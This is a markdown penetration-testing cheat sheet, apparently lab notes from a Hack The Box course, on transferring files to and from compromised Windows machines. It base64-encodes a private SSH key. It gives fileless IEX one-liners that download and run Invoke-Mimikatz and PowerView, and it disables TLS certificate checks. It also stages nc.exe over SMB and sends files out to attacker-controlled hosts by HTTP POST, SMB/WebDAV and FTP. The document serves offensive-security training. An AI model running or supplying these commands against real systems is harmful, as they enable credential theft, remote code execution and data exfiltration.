# file transfer Windows


## Copy and paste
Note: It's not always possible to use. cmd.exe has a maximum string length of 8,191 characters. Also, a web shell may error.

### Encode to base64 as here with an example RSA key
```sh
cat id_rsa |base64 -w 0;echo
```
### Convert in Powershell
```sh
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
### Decode Base64 String in Linux
```sh
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts```
```

## PowerShell Web Downloads 

### via Webclient
- methods: https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0
```sh
# Download via Webclient
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
# Download via Webclient
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

### via WebClient Fileless
- IEX is running in memory so it dont store the powershell file on disk
```sh
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

#IEX also accepts pipeline input. (IEX at end)
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell 3,0 Invoke-WebRequest
It is noticeably slower at downloading files. You can use the aliases iwr, **curl**, and **wget** instead of the Invoke-WebRequest full name.
```sh
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

### Common Errors with PowerShell
- Error: The response content cannot be parsed because the Internet Explorer engine is not available
Use -UseBasicParsing to ignore this error
```sh
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
- Error: "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."
bypass with this:
```sh
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
## PowerShell Web Uploads
### Receiving Webserver
- Installing a Configured WebServer with Upload
```sh
pip3 install uploadserver
```
- Start the Webserver
```sh
python3 -m uploadserver
```
### Upload via Powershell
```sh
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
### PowerShell Base64 Web Upload
```sh
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

## SMB 
### SMB Uploads
#### Unauthenticated
_New versions will block when unauthicated_
- Create SMB server
```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
- Copy a File from the SMB Server
```sh
copy \\192.168.220.133\share\nc.exe

```
#### Authenticated
- Create SMB server with authentication
```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
- Copy a File from the SMB Server Authenticated
```sh
net use n: \\192.168.220.133\share /user:test test
```

### SMB Downloads
- on attacker we ne to Configuring WebDav Server
```sh
sudo pip3 install wsgidav cheroot
```
- Using the WebDav Python module
```sh
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
- Connecting to the Webdav Share
```sh
dir \\192.168.49.128\DavWWWRoot
```
-Uploading Files using SMB
```sh
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

## FTP 

### FTP Downloads
- Installing the FTP Server
```sh
sudo pip3 install pyftpdlib
```
- Setting up a Python3 FTP Server
```sh
sudo python3 -m pyftpdlib --port 21
```
- Transfering Files from an FTP Server Using PowerShell
```sh
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
### FTP Uploads
- running the FTP Server
```sh
sudo python3 -m pyftpdlib --port 21 --write
```
- PowerShell Upload File
```sh
 (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

# Method 2: Create a Command File for the FTP Client to Upload a File 
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```